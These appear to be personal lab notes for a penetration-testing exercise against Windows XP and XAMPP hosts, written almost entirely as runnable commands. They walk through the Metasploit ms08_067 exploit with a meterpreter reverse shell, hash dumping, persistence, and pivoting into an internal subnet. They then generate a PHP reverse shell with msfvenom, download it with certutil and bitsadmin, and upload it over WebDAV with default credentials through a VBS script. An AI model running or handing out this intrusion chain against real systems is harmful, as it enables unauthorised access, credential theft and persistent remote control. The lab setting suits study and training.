

sudo apt update
sudo apt install nmap -y


nmap -Pn -T4 -F {TARGET_IP}

Pro-Tip: While scanning watch the traffic
sudo tcpdump -i eth0 host {TARGET_IP}


Now that we have verified port 445 is open ... let's go to work


msfconsole
search ms08_067
use exploit/windows/smb/ms08_067_netapi
set PAYLOAD windows/meterpreter/reverse_tcp
set RHOSTS {TARGET_IP}
set LHOST {YOUR_IP}
set LPORT 4444
show options
exploit


#... if you breach the machine spirit ... 
meterpreter >
These commands are available:
	sysinfo – View system info
	getuid – Show who you are
	hashdump – Dump user password hashes
	screenshot – Capture screen
	shell – Full command-line access
	
#... now to control the machine spirit ...
meterpreter > getuid
meterpreter > execute -f notepad.exe -i
#Nothing shows up ... 

meterpreter > shell
echo You have been compromised. Please stop clicking random links. > "C:\\compromised.txt"
exit

meterpreter > execute -f notepad.exe -i -a "C:\\compromised.txt"

#Payload	Command
	Open Calculator	execute -f calc.exe -i
	Open Paint	execute -f mspaint.exe -i
	Fake Shutdown Msg	Use msg * "System compromised. Contact IT now." (via shell)


meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
tasklist
#Look for processes like:
	explorer.exe
	taskmgr.exe
	winlogon.exe
	userinit.exe

explorer.exe       1448 Console    01     12,344 K

exit

meterpreter >
migrate 1448
execute -f notepad.exe -i -a "C:\\compromised.txt"


##----- TIME TO PIVOT 

meterpreter > bg

| Command                          | Purpose                                                                        | Use Context                           | Notes                                                              |
| -------------------------------- | ------------------------------------------------------------------------------ | ------------------------------------- | ------------------------------------------------------------------ |
| `run autoroute -s 10.10.10.0/24` | Automatically sets up routing for a subnet via the current Meterpreter session | **From Meterpreter** context          | Easier, recommended. Adds a route tied to the active session.      |
| `route add 10.10.10.0/24 1`      | Manually adds a route via **session ID 1** (in this case)                      | **From MSF console** (global context) | More manual control; useful when working across multiple sessions. |


set VERBOSE true

run autoroute -s 10.10.10.0/24	#NO ... 
route add 10.10.10.0/24 1  #Yes!
route print
use auxiliary/server/socks_proxy
auxiliary(server/socks_proxy) > run

use auxiliary/scanner/portscan/tcp
auxiliary(scanner/portscan/tcp) > set RHOSTS 10.10.10.100
auxiliary(scanner/portscan/tcp) > set PORTS 80
auxiliary(scanner/portscan/tcp) > run


use auxiliary/scanner/http/http_version
set RHOSTS 10.10.10.100
run



Confirm Apache on chagas
use auxiliary/scanner/http/http_header
set RHOSTS 10.10.10.100
set VERBOSE true
run



#######XXXXXXXXXXX STARTING OVER USING `sudo msfconsole` XXXXXXXXXXX#######
use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.1.53
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.36
set LPORT 2401
run

## SUCCESS 


--->>> COME BACK TO THIS - ITS NOT FOUND FOR NOW <<<---
#######XXXXXXXXXXX PERSISTANT HANDLER OPTIONS XXXXXXXXXXX#######
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.36
set LPORT 4444
exploit -j

migrate <PID>
run persistence -U -i 5 -p 4444 -r 192.168.1.36

_________________________________________________________________

route add 10.10.10.0/24 1

route print

################## MISSING ########################
use auxiliary/scanner/http/http_get
set RHOSTS 10.10.10.100
set PATH /
set VERBOSE true
run
################### END ##########################

use auxiliary/scanner/http/http_header
set RHOSTS 10.10.10.100
set RPORT 80
set VERBOSE true
run


use exploit/windows/http/xampp_webdav_upload_php
set RHOST 10.10.10.100           # Target: chagas
set LHOST 10.10.10.50            # Callback goes to ringworm (the pivot point)
set LPORT 4445                   # Or another unused port
set PATH /webdav/
#set PAYLOAD windows/meterpreter/reverse_tcp

exploit

***THIS FAILS ... but there should be a page to review it and how to trouble shoot it***3
## Next knock on the door: 

Step 1: Generate a PHP Reverse Shell Payload
On vapour (Kali), open a terminal
Run this command exactly:
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.50 LPORT=4445 -f raw -o shell.php

Step-by-Step: Transfer shell.php from Kali → XP
cd /tmp
python3 -m http.server 8000
#This creates a web server on vapour hosting the shell file: http://192.168.1.36:8000/shell.php

#If PowerShell exists (might not on XP), try:
execute -f cmd.exe -i -H

#Final Step: Download shell.php from vapour to ringworm
certutil -urlcache -split -f http://192.168.1.36:8000/shell.php shell.php

#If that fails, exit to metrepreter and run this
bitsadmin /transfer "badboy" http://192.168.1.36:8000/shell.php C:\WINDOWS\Temp\shell.php

#and if that too fails ... work from the meterpreter session (active)
upload /tmp/shell.php C:\\WINDOWS\\Temp\\shell.php


shell

#Create the uploader script (upload.vbs) in C:\WINDOWS\Temp
echo Set x = CreateObject("Microsoft.XMLHTTP") > C:\WINDOWS\Temp\upload.vbs
echo x.Open "PUT", "http://10.10.10.100/webdav/shell.php", False >> C:\WINDOWS\Temp\upload.vbs
echo x.setRequestHeader "Content-Type", "application/octet-stream" >> C:\WINDOWS\Temp\upload.vbs
echo x.Send CreateObject("Scripting.FileSystemObject").OpenTextFile("C:\WINDOWS\Temp\shell.php", 1).ReadAll >> C:\WINDOWS\Temp\upload.vbs

#This script:
#Uses XMLHTTP to create a PUT request
#Sends the contents of shell.php to /webdav/shell.php on chagas

## Run the script
cscript C:\WINDOWS\Temp\upload.vbs


If that fails, time to retry with more POWA

```
echo Set objXMLHTTP = CreateObject("Microsoft.XMLHTTP") > C:\WINDOWS\Temp\upload.vbs
echo Set objFSO = CreateObject("Scripting.FileSystemObject") >> C:\WINDOWS\Temp\upload.vbs
echo Set objFile = objFSO.OpenTextFile("C:\WINDOWS\Temp\shell.php", 1) >> C:\WINDOWS\Temp\upload.vbs
echo strData = objFile.ReadAll >> C:\WINDOWS\Temp\upload.vbs
echo objFile.Close >> C:\WINDOWS\Temp\upload.vbs
echo objXMLHTTP.Open "PUT", "http://10.10.10.100/webdav/shell.php", False, "wampp", "xampp" >> C:\WINDOWS\Temp\upload.vbs
echo objXMLHTTP.setRequestHeader "Content-Type", "application/octet-stream" >> C:\WINDOWS\Temp\upload.vbs
echo objXMLHTTP.Send strData >> C:\WINDOWS\Temp\upload.vbs
```

cscript C:\WINDOWS\Temp\upload.vbs


###Now: Trigger the Reverse Shell
# --->>> IN A NEW SHELL!!!!! <<<---
 
 
 
 
 
```
use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.1.53
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.36     
set LPORT 4949
exploit

route add 10.10.10.0/24 1



Step 1: Start the Listener on vapour (that is running on ringworm)
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.10.10.50
set LPORT 4445
exploit -j
```

***** BACK ON THE FIRST INSTANCE OF METASPLOIT *****
Step 2: Trigger the Payload from ringworm
```
sessions -i 1
execute -f cmd.exe -i -H
start http://10.10.10.100/webdav/shell.php
```

#@@if shit gets all backwards ... just use jobs to find where the issue is, it's a damn mess using one terminal/msfconsole, using two is worse! 

##### ON CHAGAS ######
something that has to be done on Chagas ... this should be a startup point 
#Alias /webdav "C:/xampp/webdav" #this is just a virtual folder, not real ... we need it to be real ...

cscript C:\WINDOWS\Temp\upload.vbs
dir \\10.10.10.100\C$\xampp\webdav


### More debugging .........

```
echo Set objXMLHTTP = CreateObject("Microsoft.XMLHTTP") > C:\WINDOWS\Temp\upload.vbs
echo Set objFSO = CreateObject("Scripting.FileSystemObject") >> C:\WINDOWS\Temp\upload.vbs
echo Set objFile = objFSO.OpenTextFile("C:\WINDOWS\Temp\shell.php", 1) >> C:\WINDOWS\Temp\upload.vbs
echo strData = objFile.ReadAll >> C:\WINDOWS\Temp\upload.vbs
echo objFile.Close >> C:\WINDOWS\Temp\upload.vbs
echo objXMLHTTP.Open "PUT", "http://10.10.10.100/webdav/shell.php", False, "wampp", "xampp" >> C:\WINDOWS\Temp\upload.vbs
echo objXMLHTTP.setRequestHeader "Content-Type", "application/octet-stream" >> C:\WINDOWS\Temp\upload.vbs
echo objXMLHTTP.Send strData >> C:\WINDOWS\Temp\upload.vbs
echo WScript.Echo "HTTP Status: " ^& objXMLHTTP.Status >> C:\WINDOWS\Temp\upload.vbs

cscript C:\WINDOWS\Temp\upload.vbs

```













































































































































































































































































































































































































































































































































































































































































































































































































































































































